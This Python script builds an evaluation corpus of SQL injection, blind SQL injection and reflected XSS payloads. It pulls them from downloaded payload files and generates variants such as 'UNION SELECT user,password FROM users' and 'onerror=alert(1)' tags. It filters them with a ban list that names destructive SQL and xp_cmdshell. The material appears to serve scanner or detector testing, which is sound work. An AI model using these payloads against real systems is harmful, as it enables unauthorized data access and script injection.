"""M2-2a/2b: build a LARGE, CLEAN, RELEVANT payload corpus by combining
(a) internet payload files in data/raw_payloads/ with (b) systematic generation.
Sort to our 3 vuln classes, dedup, drop destructive/irrelevant. Output:
data/corpus_payloads.json = {sqli:[...], sqli_blind:[...], xss_reflected:[...]}.
Offline. Usage: python eval/build_corpus.py"""
from __future__ import annotations
import json, re, itertools
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
RAW = ROOT / "data" / "raw_payloads"
OUT = ROOT / "data" / "corpus_payloads.json"

# drop anything destructive or clearly irrelevant (we only do read-only SELECT/reflection)
_BAN = re.compile(r"\b(drop|delete|insert|update|truncate|alter|shutdown|xp_cmdshell|"
                  r"load_file|into\s+outfile|benchmark|sleep\s*\(|waitfor|pg_sleep)\b", re.I)


def classify(p: str) -> str | None:
    s = p.lower()
    if "<" in p or "javascript:" in s or "onerror" in s or "onload" in s or "alert(" in s or "<script" in s:
        return "xss_reflected"
    if re.search(r"\b(and|or)\b.*\b\d\s*=\s*\d", s) and ("sleep" not in s):
        return "sqli_blind" if re.search(r"\band\b", s) else "sqli"
    if "union" in s or "select" in s or "'='" in s or "--" in s or "'1'='1" in s or "' or " in s or "admin'" in s:
        return "sqli"
    return None


def gen_sqli():
    cmt = [" -- ", " #", "-- ", "", "/*", "-- -"]
    ctx = ["1", "'", "\"", "1'", "1\"", "abc", "-1"]
    cores = ["OR '1'='1", "OR 1=1", "OR 'a'='a", "OR 2>1", "UNION SELECT NULL",
             "UNION SELECT 1,2", "UNION SELECT user,password FROM users", "ORDER BY 1", "ORDER BY 5"]
    out = set()
    for c, core, cm in itertools.product(ctx, cores, cmt):
        out.add(f"{c} {core}{cm}".strip())
        out.add(f"{c}' {core}{cm}".strip())
    return list(out)


def gen_blind():
    base = ["1", "1'", "1\""]
    tf = [("AND 1=1", "AND 1=2"), ("AND '1'='1", "AND '1'='2"), ("AND 2>1", "AND 2<1"),
          ("AND 'a'='a", "AND 'a'='b"), ("OR 1=1", "OR 1=2"),
          ("AND LENGTH(database())>0", "AND LENGTH(database())<0"),
          ("AND (SELECT 1)=1", "AND (SELECT 1)=2")]
    cmt = [" -- ", " #", "", "-- "]
    out = set()
    for b, (t, f), cm in itertools.product(base, tf, cmt):
        out.add(f"{b} {t}{cm}".strip()); out.add(f"{b} {f}{cm}".strip())
    return list(out)


def gen_xss():
    tags = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>", "<video><source onerror=alert(1)>", "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>", "<a href=javascript:alert(1)>x</a>", "<math><mi xlink:href=javascript:alert(1)>"]
    muts = []
    for t in tags:
        muts += [t, t.upper(), t.replace(" ", "/"), t.replace("alert(1)", "prompt(1)"),
                 t.replace("<", "<>").replace("<>", "<"), t.replace("=", "=\t")]
    benign = ["hello", "test name", "John", "plain123", "a<b", "normal text", "Mozart"]
    return list(dict.fromkeys(muts + benign))


def main():
    corpus = {"sqli": set(), "sqli_blind": set(), "xss_reflected": set()}
    # (a) internet files
    n_net = 0
    for f in sorted(RAW.glob("*.txt")):
        for ln in f.read_text(encoding="utf-8", errors="ignore").splitlines():
            p = ln.strip()
            if not p or len(p) > 300 or _BAN.search(p):
                continue
            cls = classify(p)
            if cls:
                corpus[cls].add(p); n_net += 1
    # (b) systematic generation
    for p in gen_sqli():
        if not _BAN.search(p):
            corpus["sqli"].add(p)
    for p in gen_blind():
        if not _BAN.search(p):
            corpus["sqli_blind"].add(p)
    for p in gen_xss():
        corpus["xss_reflected"].add(p)
    # add benign/control probes to every class (for no_observed_effect labels)
    for b in ["1", "2", "3", "abc", "test", "100", "-1", "0", "guest"]:
        corpus["sqli"].add(b); corpus["sqli_blind"].add(b)

    final = {k: sorted(v) for k, v in corpus.items()}
    OUT.write_text(json.dumps(final, ensure_ascii=False, indent=1), encoding="utf-8")
    print("dari internet (keclassify):", n_net)
    for k, v in final.items():
        print(f"  {k}: {len(v)} payload unik")
    print("TOTAL:", sum(len(v) for v in final.values()), "->", OUT)


if __name__ == "__main__":
    main()
